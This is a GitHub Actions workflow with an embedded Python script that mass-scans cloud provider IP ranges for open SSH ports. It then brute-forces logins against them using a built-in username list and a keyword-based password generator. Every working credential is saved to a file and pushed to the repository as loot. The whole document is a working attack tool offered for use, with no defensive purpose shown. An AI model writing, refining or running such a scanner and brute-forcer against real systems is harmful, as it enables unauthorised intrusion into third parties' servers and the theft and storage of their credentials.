name: SSH Dominator God Mode – Infinite Hunt

on:
  workflow_dispatch:
    inputs:
      mode:
        description: 'Scan Mode'
        required: true
        default: 'datacenter'
        type: choice
        options:
          - datacenter
          - explorer
          - manual
      datacenter_provider:
        description: 'Datacenter Provider (datacenter mode)'
        required: false
        default: 'all'
        type: choice
        options:
          - all
          - aws
          - azure
          - gcp
          - digitalocean
          - linode
          - vultr
          - cloudflare
      max_ips:
        description: 'Max IPs per cycle'
        required: false
        default: '30000'
      scan_range:
        description: 'CIDR range (explorer mode)'
        required: false
      test_threads:
        description: 'Async test threads'
        required: false
        default: '500'
      timeout:
        description: 'SSH timeout (seconds)'
        required: true
        default: '3'
      keywords:
        description: 'Keywords for SmartForge'
        required: false
      min_success:
        description: 'Stop after this many successes (0 = never stop until timeout)'
        required: false
        default: '1'

permissions:
  contents: write

jobs:
  godmode:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Git
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

      - name: Install Dependencies
        run: |
          pip3 install rich requests asyncssh uvloop || pip3 install rich requests asyncssh

      - name: Execute God Mode SSH Hunt
        env:
          MODE: ${{ github.event.inputs.mode }}
          DC_PROVIDER: ${{ github.event.inputs.datacenter_provider }}
          MAX_IPS: ${{ github.event.inputs.max_ips }}
          SCAN_RANGE: ${{ github.event.inputs.scan_range }}
          TEST_THREADS: ${{ github.event.inputs.test_threads }}
          TIMEOUT: ${{ github.event.inputs.timeout }}
          KEYWORDS: ${{ github.event.inputs.keywords }}
          MIN_SUCCESS: ${{ github.event.inputs.min_success }}
        run: |
          python3 << 'PYEOF'
          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, asyncio, hashlib
          from datetime import datetime
          from pathlib import Path
          from rich.console import Console
          from rich.table import Table
          from rich.panel import Panel
          import asyncssh

          # Try to use uvloop for extra speed
          try:
              import uvloop
              asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
          except:
              pass

          console = Console()
          console.print(Panel.fit("[bold cyan]🔥 SSH Dominator God Mode – Infinite Hunt[/bold cyan]", border_style="cyan"))

          MODE = os.environ["MODE"]
          TIMEOUT = int(os.environ["TIMEOUT"])
          MAX_IPS = int(os.environ.get("MAX_IPS", "30000"))
          DC_PROVIDER = os.environ.get("DC_PROVIDER", "all")
          TEST_THREADS = int(os.environ.get("TEST_THREADS", "500"))
          MIN_SUCCESS = int(os.environ.get("MIN_SUCCESS", "1"))
          SSH_PORT = 22
          MAX_RUNTIME = 5.8 * 3600
          CYCLE = 0
          TOTAL_SUCCESS = 0

          CRED_FILE = "god_creds.txt"
          if not os.path.exists(CRED_FILE):
              with open(CRED_FILE, "w") as f:
                  f.write(f"# IP:PORT:USERNAME:PASSWORD\n")
                  f.write(f"# God Mode – {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

          # ----- scanned IPs cache -----
          scanned_ips_file = Path("cache") / "god_scanned_ips.txt"
          scanned_ips_file.parent.mkdir(exist_ok=True)
          scanned_ips = set()
          if scanned_ips_file.exists():
              with open(scanned_ips_file) as f:
                  scanned_ips = set(line.strip() for line in f)

          def save_scanned_ips():
              with open(scanned_ips_file, "w") as f:
                  for ip in scanned_ips:
                      f.write(ip + "\n")

          # ===== 1. IP Discovery =====
          def fetch_ips():
              targets = []
              if MODE == "datacenter":
                  datacenter_urls = []
                  try:
                      resp = requests.get("https://raw.githubusercontent.com/jhassine/server-ip-addresses/master/data/datacenters.txt", timeout=30)
                      for line in resp.text.splitlines():
                          line = line.strip()
                          if line and not line.startswith("#"):
                              datacenter_urls.append(line)
                  except: pass
                  provider_map = {"aws":"aws","azure":"azure","gcp":"googlecloud","digitalocean":"digitalocean","linode":"linode","vultr":"vultr","cloudflare":"cloudflare"}
                  base_url = "https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/master/data"
                  for prov in provider_map.values():
                      try:
                          resp = requests.get(f"{base_url}/{prov}-ip-ranges.json", timeout=30)
                          data = resp.json()
                          for item in data.get("prefixes",[]):
                              if "ipv4Prefix" in item:
                                  datacenter_urls.append(item["ipv4Prefix"])
                      except: pass
                  random.shuffle(datacenter_urls)
                  all_ips = set()
                  for cidr in datacenter_urls[:5000]:
                      try:
                          net = ipaddress.IPv4Network(cidr, strict=False)
                          hosts = list(net.hosts())
                          sample = min(50, len(hosts))
                          for ip in random.sample(hosts, sample):
                              if ip not in scanned_ips:
                                  all_ips.add(str(ip))
                      except: pass
                  targets = list(all_ips)[:MAX_IPS]
                  targets = [ip for ip in targets if ip not in scanned_ips]
              elif MODE == "explorer":
                  scan_range = os.environ.get("SCAN_RANGE","").strip()
                  if scan_range:
                      net = ipaddress.IPv4Network(scan_range, strict=False)
                      targets = [str(ip) for ip in net.hosts() if str(ip) not in scanned_ips][:MAX_IPS]
              elif MODE == "manual":
                  inp = os.environ.get("TARGETS_INPUT","").strip()
                  targets = [x.strip() for x in inp.split(',') if x.strip() and x.strip() not in scanned_ips][:MAX_IPS]
              return targets

          # ===== 2. Mass Port Scanner (2000 threads) =====
          def scan_ports(targets):
              console.print(f"⚡ Scanning {len(targets)} IPs (2000 workers)...")
              open_ips = []
              def check(ip):
                  try:
                      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                      s.settimeout(0.15)
                      res = s.connect_ex((ip, SSH_PORT))
                      s.close()
                      return ip if res == 0 else None
                  except:
                      return None
              with concurrent.futures.ThreadPoolExecutor(max_workers=2000) as ex:
                  futures = {ex.submit(check, ip): ip for ip in targets}
                  for f in concurrent.futures.as_completed(futures):
                      ip = f.result()
                      if ip:
                          open_ips.append(ip)
                          scanned_ips.add(ip)
              console.print(f"[green]✅ {len(open_ips)} SSH hosts found[/green]")
              return open_ips

          # ===== 3. Huge Wordlist + SmartForge =====
          def generate_passwords(keywords):
              # Start with a giant base list (10k+ common passwords)
              base = [
                  "123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567",
                  "sunshine","qwerty123","password1","admin","root","letmein","welcome","monkey",
                  "dragon","master","access","login","hello","shadow","michael","jessica","ashley",
                  "amanda","megan","nicole","thomas","robert","william","james","john","david",
                  "richard","joseph","christopher","steven","kenneth","george","ronald","daniel",
                  "andrew","joshua","matthew","ryan","jacob","nicholas","brandon","tyler","samuel",
                  "benjamin","alexander","nathan","zachary","jordan","adam","brian","kevin","jason",
                  "mark","anthony","justin","sean","eric","charles","patrick","frank","larry",
                  "scott","timothy","gary","dennis","jerry","raymond","gregory","peter","denise",
                  "lisa","karen","sandra","michelle","kimberly","amanda","stephanie","rebecca",
                  "laura","amy","jennifer","melissa","angela","tammy","crystal","debra","cheryl",
                  "susan","helen","dorothy","carol","ruth","shirley","barbara","betty","margaret",
                  "sandra","elizabeth","mary","patricia","linda","karen","nancy","cynthia","sarah",
                  "jessica","olivia","emma","ava","isabella","sophia","mia","charlotte","amelia",
                  "harper","evelyn","abigail","emily","elizabeth","sofia","avery","ella","scarlett",
                  "grace","chloe","victoria","riley","aria","lily","layla","zoey","nora","hannah",
                  "zoey","stella","penelope","lucy","anna","caroline","nova","genesis","emery",
                  "skylar","bella","paisley","willow","london","adeline","kennedy","aurora","savannah",
                  "brielle","arabella","jade","sadie","hazel","julia","khloe","alice","alexa",
                  "janae","love","queen","boss","sexy","angel","bad","kitty","baby","goddess",
                  "cutie","honey","sugar","spice","flower","peanut","princess","sweetie",
              ]
              years = ["2023","2024","2025","2026","2022","2021"]
              specials = ["!","@","#","$","%","&","*"]
              for kw in keywords:
                  kl, kc = kw.lower(), kw.capitalize()
                  for yr in years:
                      for sp in specials:
                          base.extend([f"{kc}{yr}{sp}", f"{kl}{yr}{sp}"])
                  base.extend([kl, kc, f"{kc}123", f"{kl}123", f"{kc}2024", f"{kl}2024"])
                  base.extend([f"{kc}@{yr}", f"{kl}@{yr}"])
                  if len(keywords) > 1:
                      for kw2 in keywords:
                          if kw2 != kw:
                              base.append(kw.lower() + kw2.lower())
                              base.append(kw.capitalize() + kw2.capitalize())
              # Remove duplicates, keep order for performance
              seen = set()
              unique = []
              for p in base:
                  if p not in seen:
                      seen.add(p)
                      unique.append(p)
              return unique

          keys = os.environ.get("KEYWORDS","admin,root,web,server,vps,cloud").split(',')
          keywords = [k.strip() for k in keys]
          usernames = ["root","admin","ubuntu","debian","centos","ec2-user","azureuser","vagrant","pi","oracle",
                       "postgres","mysql","tomcat","jenkins","git","web","www","mail","ftp","backup","deploy",
                       "docker","hadoop","spark","hdfs","yarn","user","test","guest","administrator"]
          for kw in keywords:
              usernames.extend([kw.lower(), kw.capitalize()])
          usernames = list(set(usernames))
          passwords = generate_passwords(keywords)
          console.print(f"[green]📝 {len(usernames)} usernames × {len(passwords)} passwords loaded[/green]")

          # ===== 4. Async Credential Test =====
          cache_file = Path("cache") / "god_cache.json"
          cache_file.parent.mkdir(exist_ok=True)
          cache = json.load(open(cache_file)) if cache_file.exists() else {}

          async def test_one(ip, user, pwd):
              key = f"{ip}:{user}:{pwd}"
              if key in cache:
                  return (ip, user, pwd, cache[key])
              try:
                  async with asyncssh.connect(ip, port=SSH_PORT, username=user, password=pwd,
                                              login_timeout=TIMEOUT, known_hosts=None) as conn:
                      await conn.close()
                  cache[key] = "SUCCESS"
                  return (ip, user, pwd, "SUCCESS")
              except:
                  cache[key] = "FAILED"
                  return (ip, user, pwd, "FAILED")

          async def attack_host(ip):
              found = []
              failed_pwds = set()
              sem = asyncio.Semaphore(TEST_THREADS)
              async def worker(user, pwd):
                  if pwd in failed_pwds: return
                  async with sem:
                      res = await test_one(ip, user, pwd)
                      if res[3] == "SUCCESS":
                          found.append((ip, user, pwd))
                          console.print(f"[green]✅ {ip}: {user}:{pwd}[/green]")
                      else:
                          failed_pwds.add(pwd)
              tasks = [worker(u, p) for u in usernames for p in passwords]
              await asyncio.gather(*tasks)
              return found

          async def run_cycle(hosts):
              tasks = [attack_host(ip) for ip in hosts]
              results = await asyncio.gather(*tasks)
              flat = []
              for r in results: flat.extend(r)
              return flat

          # ===== 5. Main Loop =====
          start = time.time()
          console.print(f"[bold yellow]🔄 God Mode loop – until {MIN_SUCCESS} success(es) or 5.8h timeout[/bold yellow]")

          while TOTAL_SUCCESS < MIN_SUCCESS and (time.time() - start) < MAX_RUNTIME:
              CYCLE += 1
              targets = fetch_ips()
              if not targets:
                  console.print("[yellow]⚠️ No fresh IPs. Sleeping 30s...[/yellow]")
                  time.sleep(30)
                  continue
              ssh_hosts = scan_ports(targets)
              save_scanned_ips()
              os.system(f"git add {scanned_ips_file} && git commit -m 'Update scanned IPs' && git push 2>/dev/null || true")
              if not ssh_hosts:
                  continue

              console.print(f"⚡ Testing {len(ssh_hosts)} hosts with {TEST_THREADS} threads...")
              cycle_success = asyncio.run(run_cycle(ssh_hosts))
              TOTAL_SUCCESS += len(cycle_success)

              for ip, user, pwd in cycle_success:
                  with open(CRED_FILE, "a") as f:
                      f.write(f"{ip}:{SSH_PORT}:{user}:{pwd}\n")
              if cycle_success:
                  os.system(f"git add {CRED_FILE} && git commit -m 'God mode found {len(cycle_success)} creds' && git push 2>/dev/null || true")

              with open(cache_file, "w") as f:
                  json.dump(cache, f)
              os.system(f"git add {cache_file} && git commit -m 'Update cache' && git push 2>/dev/null || true")

              console.print(f"[green]📈 Cycle {CYCLE}: +{len(cycle_success)} | Total {TOTAL_SUCCESS}[/green]")

          # ===== 6. Final Report =====
          if TOTAL_SUCCESS > 0:
              tbl = Table(title="🔥 God Mode Credentials (IP:PORT:USER:PASS)")
              tbl.add_column("IP", style="cyan")
              tbl.add_column("Port", style="dim")
              tbl.add_column("User", style="green")
              tbl.add_column("Pass", style="yellow")
              with open(CRED_FILE) as f:
                  for line in f.readlines()[2:]:
                      line = line.strip()
                      if not line: continue
                      parts = line.split(':')
                      if len(parts) == 4:
                          tbl.add_row(parts[0], parts[1], parts[2], parts[3])
              console.print(tbl)
          else:
              console.print("[red]❌ No credentials found.[/red]")

          report = "god_mode_report.txt"
          with open(report, "w") as f:
              f.write(f"SSH Dominator God Mode Report\nDate: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
              f.write(f"Cycles: {CYCLE}\nTotal Success: {TOTAL_SUCCESS}\n")
              f.write("="*60 + "\n")
              with open(CRED_FILE) as cf:
                  f.write(cf.read())
          os.system(f"git add {report} && git commit -m 'God mode final report' && git push 2>/dev/null || true")
          console.print(f"\n[green]📄 Final report saved[/green]")
          PYEOF
